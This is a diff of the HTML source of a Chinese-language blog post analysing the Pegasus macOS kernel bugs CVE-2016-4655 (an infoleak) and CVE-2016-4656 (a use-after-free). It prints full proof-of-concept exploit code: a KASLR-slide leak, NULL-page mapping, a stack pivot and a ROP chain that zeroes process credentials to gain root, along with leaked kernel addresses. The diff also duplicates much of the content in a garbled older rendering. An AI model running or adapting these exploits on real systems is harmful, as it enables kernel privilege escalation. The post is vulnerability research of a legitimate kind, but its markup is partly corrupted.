-<p>uint64_t kslide_infoleak(void)<br>{<br>    kern_return_t kr = 0, err = 0;<br>    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;</p>
-<pre><code>io_service_t serv = 0;
-io_connect_t conn = 0;
-io_iterator_t iter = 0;
+<pre><code>case kOSSerializeNumber:
+    bufferPos += sizeof(long long);
+    if (bufferPos &gt; bufferSize) break;
+    value = next[1];
+    value &lt;&lt;= 32;
+    value |= next[0];
+    o = OSNumber::withNumber(value, len);
+    next += 2;
+    break;
+</code></pre><p>这里存在什么问题呢？这里没有检查<code>OSNumber</code>的长度，也就是说我们可以创建一个任意长度的<code>OSNumber</code>，进而在内核读取的时候越界，然后泄漏内核地址信息。</p>
+<h3 id="CVE-2016-4656-UAF漏洞"><a href="#CVE-2016-4656-UAF漏洞" class="headerlink" title="CVE-2016-4656-UAF漏洞"></a>CVE-2016-4656-UAF漏洞</h3><p>UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。<br>来看下漏洞点，下面的代码是序列化字典dic将<code>OSString</code>这个键转化为<code>OSSymbol</code>  </p>
+<pre><code>if (dict)
+{
+        if (sym)
+        {
+            ...
+        }
+        else
+        {
+            sym = OSDynamicCast(OSSymbol, o);
+            if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))
+            {
+                sym = (OSSymbol *) OSSymbol::withString(str);
+                o-&gt;release();
+                o = 0;
+            }
+            ok = (sym != 0);
+        }
+    }
+</code></pre><p>这里<code>o-&gt;release()</code>有什么问题呢?还记得<code>objsArray</code>吧，用来存储所有的对象，但是用<code>setAtIndex</code>这个宏来将所有的对象<code>o</code>存在里面，而宏不实现任何类型的引用计数机制，所以存储在其中的引用不会被删除。这在我们不引用其他对象的时候是没有什么问题的，但如果是一个引用对象的话，看下面<code>kOSSerializeObject</code>中的<code>switchcase</code>：  </p>
+<pre><code>case kOSSerializeObject:
+    if (len &gt;= objsIdx) break;
+    o = objsArray[len];
+    o-&gt;retain();
+    isRef = true;
+    break;
+</code></pre><p>此时之前存储在之前的<code>objsArray</code>的<code>OSString</code>已经free，而 <code>o = objsArray[len]; o-&gt;retain();</code>由对其进行了<code>retain</code>引用，好的一个完美的UAF漏洞。<br>所以我们可以构造一个字典<code>dic</code>，其中<code>OSString</code>包含一些配对的值，然后序列化一个<code>kOSSerializeObject</code>引用对象，<code>OSString</code>将调用<code>retain</code>，但却是一个被释放的对象。  </p>
+<h2 id="0x04-漏洞利用-PoC分析"><a href="#0x04-漏洞利用-PoC分析" class="headerlink" title="0x04 漏洞利用-PoC分析"></a>0x04 漏洞利用-PoC分析</h2><p>同样分为两个漏洞利用：1，CVE-2016-4655-infoleak漏洞利用；2，CVE-2016-4656-UAF漏洞利用</p>
+<h3 id="CVE-2016-4655-infoleak漏洞利用"><a href="#CVE-2016-4655-infoleak漏洞利用" class="headerlink" title="CVE-2016-4655-infoleak漏洞利用"></a>CVE-2016-4655-infoleak漏洞利用</h3><p>infoleak漏洞利用步骤：</p>
+<ul>
+<li>构造一个包含过长的<code>OSNumber</code>dic字典</li>
+<li>用这个序列化字典去设置userclient对象的属性</li>
+<li>读回设置的<code>OSNumber</code>属性，造成infoleak</li>
+<li>利用读取回来的内核地址信息计算KASLR    </li>
+</ul>
+<p>完整的代码：</p>
+<pre><code>uint64_t kslide_infoleak(void)
+{
+    kern_return_t kr = 0, err = 0;
+    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;
 
-uint64_t kslide = 0;
+    io_service_t serv = 0;
+    io_connect_t conn = 0;
+    io_iterator_t iter = 0;
 
-void *dict = calloc(1, 512);
+    uint64_t kslide = 0;
+
+    void *dict = calloc(1, 512);
+    uint32_t idx = 0; // index into our data
+
+#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)
+
+    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning
+
+    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries
+
+    WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte
+    WRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key + NUL byte in little-endian
+
+    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number
+    WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big numbe
+
+    host_get_io_master(mach_host_self(), &amp;master); // get iokit master port
+
+    kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);
+    if (kr == KERN_SUCCESS) {
+        printf(&quot;(+) Dictionary is valid! Spawning user client...\n&quot;);
+    } else
+        return -1;
+
+    serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;));
+
+    kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);
+    if (kr == KERN_SUCCESS) {
+        printf(&quot;(+) UC successfully spawned! Leaking bytes...\n&quot;);
+    } else
+        return -1;
+
+    IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter);
+    io_object_t object = IOIteratorNext(iter);
+
+    char buf[0x200] = {0};
+    mach_msg_type_number_t bufCnt = 0x200;
+
+    kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt);
+    if (kr == KERN_SUCCESS) {
+        printf(&quot;(+) Done! Calculating KASLR slide...\n&quot;);
+    } else
+        return -1;
+
+#if 0
+    for (uint32_t k = 0; k &lt; 128; k += 8) {
+        printf(&quot;%#llx\n&quot;, *(uint64_t *)(buf + k));
+    }
+#endif
+
+    uint64_t hardcoded_ret_addr = 0xffffff80003934bf;
+
+    kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;
+
+    printf(&quot;(i) KASLR slide is %#016llx\n&quot;, kslide);
+
+    return kslide;
+}
+</code></pre><h4 id="构造字典"><a href="#构造字典" class="headerlink" title="构造字典"></a>构造字典</h4><pre><code>void *dict = calloc(1, 512);
 uint32_t idx = 0; // index into our data
-</code></pre><p>#define WRITE_IN(dict, data) do { <em>(uint32_t </em>)(dict + idx) = (data); idx += 4; } while (0)</p>
-<pre><code>WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning
 
-WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries
+#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)
+</code></pre><p><code>WRITE_IN</code>这个宏只是为了方便我们将数据填入内存之中  </p>
+<p>xml的字典格式  </p>
+<pre><code>&lt;dict&gt;
+    &lt;symbol&gt;AAA&lt;/symbol&gt;
+    &lt;number size=0x200&gt;0x4141414141414141&lt;/number&gt;
+&lt;/dict&gt;
+</code></pre><p>对应的代码  </p>
+<pre><code>WRITE_IN(dict, (0x000000d3)); // 头部签名
 
-WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte
-WRITE_IN(dict, (0x00414141)); // &apos;AAA&apos; key + NUL byte in little-endian
+WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // 包含两个元素的字典
 
-WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number
-WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big numbe
+WRITE_IN(dict, (kOSSerializeSymbol | 4)); // 长度为3的symbol
+WRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key键
 
-host_get_io_master(mach_host_self(), &amp;master); // get iokit master port
+WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); //0x200大小的number
+WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); //实际8字节的number
+</code></pre><p>利用<code>io_service_get_matching_services_bin</code>测试我们的<code>dic</code>是否有效  </p>
+<pre><code>host_get_io_master(mach_host_self(), &amp;master); // get iokit master port
 
 kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);
 if (kr == KERN_SUCCESS) {
     printf(&quot;(+) Dictionary is valid! Spawning user client...\n&quot;);
 } else
     return -1;
-
-serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;));
+</code></pre><p>若<code>kr == KERN_SUCCESS</code>则我们的<code>dic</code>则为有效</p>
+<h4 id="生成UserClient设定属性"><a href="#生成UserClient设定属性" class="headerlink" title="生成UserClient设定属性"></a>生成UserClient设定属性</h4><p>我们需要一个<code>UserClient</code>用来和内核通信，所以使用<code>io_service_open_extended</code>来产生一个相关服务的<code>UserClient</code>，这里的服务并不重要  </p>
+<pre><code>serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;));
 
 kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);
 if (kr == KERN_SUCCESS) {
     printf(&quot;(+) UC successfully spawned! Leaking bytes...\n&quot;);
 } else
     return -1;
-
-IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter);
+</code></pre><p>首先我们通过<code>IOServiceGetMatchingService</code>去从<code>IORegistry</code>里匹配一个特定服务，然后通过<code>io_service_open_extended</code>让可以设置其属性并打开一个服务即隐式产生<code>UserClient</code><br>接下来就需要读取属性，我们通过得到一个访问的句柄，所以迭代<code>IORegistry</code>找到刚刚创建的<code>UserClient</code>  </p>
+<pre><code>IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter);
 io_object_t object = IOIteratorNext(iter);
-
-char buf[0x200] = {0};
+</code></pre><p>先通过<code>serv</code>端口创建<code>io_iterator_t</code>，我们的<code>UserClient</code>在<code>serv</code>创建之后，所以拿到<code>iter</code>后迭代一次即为我们的<code>UserClient</code>，现在就可以读取其属性并触发info-leak。</p>
+<h4 id="读取属性，触发info-leak"><a href="#读取属性，触发info-leak" class="headerlink" title="读取属性，触发info-leak"></a>读取属性，触发info-leak</h4><pre><code>char buf[0x200] = {0};
 mach_msg_type_number_t bufCnt = 0x200;
 
 kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt);
@@ -284,144 +562,258 @@ if (kr == KERN_SUCCESS) {
     printf(&quot;(+) Done! Calculating KASLR slide...\n&quot;);
 } else
     return -1;
-</code></pre><p>#if 0<br>    for (uint32_t k = 0; k &lt; 128; k += 8) {<br>        printf(“%#llx\n”, <em>(uint64_t </em>)(buf + k));<br>    }</p>
-<p>#endif</p>
+</code></pre><p>通过<code>io_registry_entry_get_property_bytes</code>我们可以获取到原始字节，存在<code>buf</code>中，我们打印其值  </p>
+<pre><code>for (uint32_t k = 0; k &lt; 128; k += 8) {
+    printf(&quot;%#llx\n&quot;, *(uint64_t *)(buf + k));
+}
+</code></pre><p>对应输出：  </p>
+<pre><code>0x4141414141414141  // 有效的number
+0xffffff8033c66284  //
+0xffffff8035b5d800  //
+0x4                 // 其他数据或返回地址
+0xffffff803506d5a0  //
+0xffffff8033c662b4  //
+0xffffff818d2b3e30  //
+0xffffff80037934bf  // 函数返回地址
+...
+</code></pre><p>我们需要清楚函数的调用过程，那么久知道栈中返回地址所属函数<br>这里实际读取的代码位于<code>is_io_registry_entry_get_property_bytes</code>函数，即<code>io_registry_entry_get_property_bytes</code>调用了 <code>is_io_registry_entry_get_property_bytes</code></p>
+<p><code>is_io_registry_entry_get_property_bytes</code>源代码</p>
+<pre><code>/* Routine io_registry_entry_get_property */
+kern_return_t is_io_registry_entry_get_property_bytes(
+    io_object_t registry_entry,
+    io_name_t property_name,
+    io_struct_inband_t buf,
+    mach_msg_type_number_t *dataCnt )
+{
+    OSObject    *    obj;
+    OSData     *    data;
+    OSString     *    str;
+    OSBoolean    *    boo;
+    OSNumber     *    off;
+    UInt64        offsetBytes;
+    unsigned int    len = 0;
+    const void *    bytes = 0;
+    IOReturn        ret = kIOReturnSuccess;
+
+    CHECK( IORegistryEntry, registry_entry, entry );
+
+#if CONFIG_MACF
+    if (0 != mac_iokit_check_get_property(kauth_cred_get(), entry, property_name))
+        return kIOReturnNotPermitted;
+#endif
+
+    obj = entry-&gt;copyProperty(property_name);
+    if( !obj)
+        return( kIOReturnNoResources );
+
+    // One day OSData will be a common container base class
+    // until then...
+    if( (data = OSDynamicCast( OSData, obj ))) {
+    len = data-&gt;getLength();
+    bytes = data-&gt;getBytesNoCopy();
+
+    } else if( (str = OSDynamicCast( OSString, obj ))) {
+    len = str-&gt;getLength() + 1;
+    bytes = str-&gt;getCStringNoCopy();
+
+    } else if( (boo = OSDynamicCast( OSBoolean, obj ))) {
+    len = boo-&gt;isTrue() ? sizeof(&quot;Yes&quot;) : sizeof(&quot;No&quot;);
+    bytes = boo-&gt;isTrue() ? &quot;Yes&quot; : &quot;No&quot;;
+
+    } else if( (off = OSDynamicCast( OSNumber, obj ))) {    /* j: reading an OSNumber */
+    offsetBytes = off-&gt;unsigned64BitValue();
+    len = off-&gt;numberOfBytes();
+    bytes = &amp;offsetBytes;
+#ifdef __BIG_ENDIAN__
+    bytes = (const void *)
+        (((UInt32) bytes) + (sizeof( UInt64) - len));
+#endif
+
+    } else
+    ret = kIOReturnBadArgument;
+
+    if( bytes) {
+    if( *dataCnt &lt; len)
+        ret = kIOReturnIPCError;
+    else {
+            *dataCnt = len;
+            bcopy( bytes, buf, len );
+    }
+    }
+    obj-&gt;release();
+
+    return( ret );
+}
+</code></pre><p>下面代码表示正在读取<code>OSNumber</code>，</p>
+<pre><code>...
+else if( (off = OSDynamicCast( OSNumber, obj ))) {
+    offsetBytes = off-&gt;unsigned64BitValue(); /* j: the offsetBytes variable is allocated on the stack */
+    len = off-&gt;numberOfBytes(); /* j: this reads out our malformed length, 0x200 */
+    bytes = &amp;offsetBytes; /* j: bytes* ptr points to a stack variable */
+
+    ...
+}
+...
+</code></pre><p>然后</p>
+<pre><code>if( bytes) {
+    if( *dataCnt &lt; len)
+        ret = kIOReturnIPCError;
+    else {
+        *dataCnt = len;
+        bcopy( bytes, buf, len ); /* j: this leaks data from the stack */
+    }
+}
+</code></pre><p>执行<code>bcopy</code>时，从<code>bytes</code>里读取了错误的长度，指向堆栈变量，泄漏函数返回地址，我们只需要找到一个地址减去静态地址，那么就能计算出内核偏移值</p>
+<h4 id="计算内核偏移"><a href="#计算内核偏移" class="headerlink" title="计算内核偏移"></a>计算内核偏移</h4><p>将<code>/System/Library/Kernels/kernel</code>拖入hopper，搜索<code>is_io_registry_entry_get_property_bytes</code>，如下图  </p>
+<p><img src="/4ch12dy/4ch12dy.github.io.git/md_source/paper/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-0.png" alt="0-0"></p>
+<p>然后通过Xref找到调用的下一条地址即返回地址，最后将之前偏移后的地址-静态地址就等到了内核偏移值</p>
+<pre><code>0xffffff80037934bf - 0xffffff80003934bf = 0x3400000
+</code></pre><p>也就是下面这段代码所示：  </p>
 <pre><code>uint64_t hardcoded_ret_addr = 0xffffff80003934bf;
 
 kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;
 
 printf(&quot;(i) KASLR slide is %#016llx\n&quot;, kslide);
+</code></pre><p>现在获取到了内核偏移值就可以利用UAF漏洞执行ROP链然后提权root。here we go！</p>
+<h3 id="CVE-2016-4656-UAF漏洞利用"><a href="#CVE-2016-4656-UAF漏洞利用" class="headerlink" title="CVE-2016-4656-UAF漏洞利用"></a>CVE-2016-4656-UAF漏洞利用</h3><p>XNU的堆分配器被称为zalloc，这次我可以偷下懒了，与我之前分析得linux堆分配器相比虽然细节上可能有所不同，但基本原理都大同小异，简单的说来就是提供了不同的分配表，free后的元素会放入对应大小的链表之中，且位于最后，即如果时间合适，我们下次分配同样大小的内存就会返回刚free的内存。还不清楚的可以移步<a href="https://null-me.github.io/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/" target="_blank" rel="external">深入理解Linux堆分配器-DLMalloc</a>这篇分析。<br>那么下面要做的就是如何构造下一个分配的对象，这里我们用<code>OSData</code>因为可以使用原生的二进制数据。回忆之前的UAF漏洞，当下一次<code>o-&gt;retain</code>引用就会触发，这里涉及到一个C++虚拟函数表的问题，当然我之前也分析过，不清楚的可以移步<a href="https://null-me.github.io/2017/03/07/C++%20Virtual%20table/%E8%AF%A6%E8%A7%A3virtual%20table/" target="_blank" rel="external">详解virtual table</a>简单说来一个对象的地址实际指向的是vtable，通过vtable就能找到对应的函数。所以我们可以构造假的vtable地址达到控制rip到自定义的地址。当然这里还有另一个技术-map NULL。为了能够有效的利用和控制，因为其他地址可能被修改，我们如果能在NULL段进行shellcode以及ROP链的部署那么就能稳定的利用。<br>下面看我们的步骤：  </p>
+<ul>
+<li>制作一个二进制字典，释放<code>OSString</code>并重新分配<code>OSData</code>。</li>
+<li>Map NULL</li>
+<li>放置stack pivot在偏移0x20到NULL页面</li>
+<li>将一个小的传输链0x0放置在NULL页面中（这将传递执行到主链）</li>
+<li>触发漏洞</li>
+<li>提升权限，生成shell</li>
+</ul>
+<p>下面看完整的Poc代码：  </p>
+<pre><code>void use_after_free(void)
+{
+    kern_return_t kr = 0;
+    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;
 
-return kslide;
-</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#### 构造字典</div></pre></td></tr></table></figure></p>
-<p>void *dict = calloc(1, 512);<br>uint32_t idx = 0; // index into our data</p>
-<p>#define WRITE_IN(dict, data) do { <em>(uint32_t </em>)(dict + idx) = (data); idx += 4; } while (0)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">`WRITE_IN `这个宏只是为了方便我们将数据填入内存之中  </div><div class="line"></div><div class="line">xml的字典格式</div></pre></td></tr></table></figure></p>
-<p><dict><br>    <symbol>AAA</symbol><br>    <number size="0x200">0x4141414141414141</number><br></dict><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">对应的代码</div></pre></td></tr></table></figure></p>
-<p>WRITE_IN(dict, (0x000000d3)); // 头部签名</p>
-<p>WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // 包含两个元素的字典</p>
-<p>WRITE_IN(dict, (kOSSerializeSymbol | 4)); // 长度为3的symbol<br>WRITE_IN(dict, (0x00414141)); // ‘AAA’ key键</p>
-<p>WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); //0x200大小的number<br>WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); //实际8字节的number<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">利用`io_service_get_matching_services_bin`测试我们的`dic`是否有效</div></pre></td></tr></table></figure></p>
-<p>host_get_io_master(mach_host_self(), &amp;master); // get iokit master port</p>
-<p>kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);<br>if (kr == KERN_SUCCESS) {<br>    printf(“(+) Dictionary is valid! Spawning user client…\n”);<br>} else<br>    return -1;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">若`kr == KERN_SUCCESS`则我们的`dic`则为有效</div><div class="line"></div><div class="line">#### 生成UserClient设定属性</div><div class="line">我们需要一个`UserClient`用来和内核通信，所以使用`io_service_open_extended`来产生一个相关服务的`UserClient`，这里的服务并不重要</div></pre></td></tr></table></figure></p>
-<p>serv = IOServiceGetMatchingService(master, IOServiceMatching(“IOHDIXController”));</p>
-<p>kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);<br>if (kr == KERN_SUCCESS) {<br>    printf(“(+) UC successfully spawned! Leaking bytes…\n”);<br>} else<br>    return -1;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">首先我们通过`IOServiceGetMatchingService`去从`IORegistry`里匹配一个特定服务，然后通过`io_service_open_extended`让可以设置其属性并打开一个服务即隐式产生`UserClient`  </div><div class="line">接下来就需要读取属性，我们通过得到一个访问的句柄，所以迭代`IORegistry`找到刚刚创建的`UserClient`</div></pre></td></tr></table></figure></p>
-<p>IORegistryEntryCreateIterator(serv, “IOService”, kIORegistryIterateRecursively, &amp;iter);<br>io_object_t object = IOIteratorNext(iter);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">先通过`serv`端口创建`io_iterator_t`，我们的`UserClient`在`serv`创建之后，所以拿到`iter`后迭代一次即为我们的`UserClient`，现在就可以读取其属性并触发info-leak。</div><div class="line"></div><div class="line">#### 读取属性，触发info-leak</div></pre></td></tr></table></figure></p>
-<p>char buf[0x200] = {0};<br>mach_msg_type_number_t bufCnt = 0x200;</p>
-<p>kr = io_registry_entry_get_property_bytes(object, “AAA”, (char *)&amp;buf, &amp;bufCnt);<br>if (kr == KERN_SUCCESS) {<br>    printf(“(+) Done! Calculating KASLR slide…\n”);<br>} else<br>    return -1;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">通过`io_registry_entry_get_property_bytes`我们可以获取到原始字节，存在`buf`中，我们打印其值</div></pre></td></tr></table></figure></p>
-<p>for (uint32_t k = 0; k &lt; 128; k += 8) {<br>    printf(“%#llx\n”, <em>(uint64_t </em>)(buf + k));<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">对应输出：</div></pre></td></tr></table></figure></p>
-<p>0x4141414141414141  // 有效的number<br>0xffffff8033c66284  //<br>0xffffff8035b5d800  //<br>0x4                 // 其他数据或返回地址<br>0xffffff803506d5a0  //<br>0xffffff8033c662b4  //<br>0xffffff818d2b3e30  //<br>0xffffff80037934bf  // 函数返回地址<br>…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">我们需要清楚函数的调用过程，那么久知道栈中返回地址所属函数  </div><div class="line">这里实际读取的代码位于`is_io_registry_entry_get_property_bytes`函数，即`io_registry_entry_get_property_bytes`调用了 `is_io_registry_entry_get_property_bytes`</div><div class="line"></div><div class="line">`is_io_registry_entry_get_property_bytes`源代码</div></pre></td></tr></table></figure></p>
-<p>/<em> Routine io_registry_entry_get_property </em>/<br>kern_return_t is_io_registry_entry_get_property_bytes(<br>    io_object_t registry_entry,<br>    io_name_t property_name,<br>    io_struct_inband_t buf,<br>    mach_msg_type_number_t <em>dataCnt )<br>{<br>    OSObject    </em>    obj;<br>    OSData     <em>    data;<br>    OSString     </em>    str;<br>    OSBoolean    <em>    boo;<br>    OSNumber     </em>    off;<br>    UInt64        offsetBytes;<br>    unsigned int    len = 0;<br>    const void *    bytes = 0;<br>    IOReturn        ret = kIOReturnSuccess;</p>
-<pre><code>CHECK( IORegistryEntry, registry_entry, entry );
-</code></pre><p>#if CONFIG_MACF<br>    if (0 != mac_iokit_check_get_property(kauth_cred_get(), entry, property_name))<br>        return kIOReturnNotPermitted;</p>
-<p>#endif</p>
-<pre><code>obj = entry-&gt;copyProperty(property_name);
-if( !obj)
-    return( kIOReturnNoResources );
+    /* craft the dictionary */
 
-// One day OSData will be a common container base class
-// until then...
-if( (data = OSDynamicCast( OSData, obj ))) {
-len = data-&gt;getLength();
-bytes = data-&gt;getBytesNoCopy();
+    printf(&quot;(i) Crafting dictionary...\n&quot;);
 
-} else if( (str = OSDynamicCast( OSString, obj ))) {
-len = str-&gt;getLength() + 1;
-bytes = str-&gt;getCStringNoCopy();
+    void *dict = calloc(1, 512);
+    uint32_t idx = 0; // index into our data
 
-} else if( (boo = OSDynamicCast( OSBoolean, obj ))) {
-len = boo-&gt;isTrue() ? sizeof(&quot;Yes&quot;) : sizeof(&quot;No&quot;);
-bytes = boo-&gt;isTrue() ? &quot;Yes&quot; : &quot;No&quot;;
+#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)
 
-} else if( (off = OSDynamicCast( OSNumber, obj ))) {    /* j: reading an OSNumber */
-offsetBytes = off-&gt;unsigned64BitValue();
-len = off-&gt;numberOfBytes();
-bytes = &amp;offsetBytes;
-</code></pre><p>#ifdef <strong>BIG_ENDIAN</strong><br>    bytes = (const void *)<br>        (((UInt32) bytes) + (sizeof( UInt64) - len));</p>
-<p>#endif</p>
-<pre><code>} else
-ret = kIOReturnBadArgument;
+    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning
 
-if( bytes) {
-if( *dataCnt &lt; len)
-    ret = kIOReturnIPCError;
-else {
-        *dataCnt = len;
-        bcopy( bytes, buf, len );
+    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 6)); // dict with 6 entries
+
+    WRITE_IN(dict, (kOSSerializeString | 4));   // string &#39;AAA&#39;, will get freed
+    WRITE_IN(dict, (0x00414141));
+
+    WRITE_IN(dict, (kOSSerializeBoolean | 1));  // bool, true
+
+    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol &#39;BBB&#39;
+    WRITE_IN(dict, (0x00424242));
+
+    WRITE_IN(dict, (kOSSerializeData | 32));    // data (0x00 * 32)
+    WRITE_IN(dict, (0x00000000));
+    WRITE_IN(dict, (0x00000000));
+    WRITE_IN(dict, (0x00000000));
+    WRITE_IN(dict, (0x00000000));
+    WRITE_IN(dict, (0x00000000));
+    WRITE_IN(dict, (0x00000000));
+    WRITE_IN(dict, (0x00000000));
+    WRITE_IN(dict, (0x00000000));
+
+    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol &#39;CCC&#39;
+    WRITE_IN(dict, (0x00434343));
+
+    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1));   // ref to object 1 (OSString)
+
+    /* map the NULL page */
+
+    mach_vm_address_t null_map = 0;
+
+    vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);
+
+    kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0);
+    if (kr != KERN_SUCCESS)
+        return;
+
+    macho_map_t *map = map_file_with_path(KERNEL_PATH_ON_DISK);
+
+    printf(&quot;(i) Leaking kslide...\n&quot;);
+
+    SET_KERNEL_SLIDE(kslide_infoleak()); // set global kernel slide
+
+    /* set the stack pivot at 0x20 */
+
+    *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot
+
+    /* build ROP chain */
+
+    printf(&quot;(i) Building ROP chain...\n&quot;);
+
+    rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));
+
+    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;));
+
+    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);
+    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;));
+
+    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);
+    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;));
+
+    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);
+    PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3));
+    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;));
+
+    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;));
+
+    /* chain transfer, will redirect execution flow from 0x0 to our main chain above */
+
+    uint64_t *transfer = (uint64_t *)0x0;
+    transfer[0] = ROP_POP_RSP(map);
+    transfer[1] = (uint64_t)chain-&gt;chain;
+
+    /* trigger */
+
+    printf(&quot;(+) All done! Triggering the bug!\n&quot;);
+
+    host_get_io_master(mach_host_self(), &amp;master); // get iokit master port
+
+    kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);
+    if (kr != KERN_SUCCESS)
+        return;
 }
-}
-obj-&gt;release();
+</code></pre><p>这里有很多的宏定义函数，先不用管这些，整个PoC代码在文章最后将会在我的GitHub上找到<br>下面一步一步分析</p>
+<h4 id="构造字典-1"><a href="#构造字典-1" class="headerlink" title="构造字典"></a>构造字典</h4><p>将如下构造  </p>
+<pre><code>&lt;dict&gt;
+    &lt;string&gt;AAA&lt;/string&gt;
+    &lt;boolean&gt;true&lt;/boolean&gt;
 
-return( ret );
-</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">下面代码表示正在读取`OSNumber`，</div></pre></td></tr></table></figure></p>
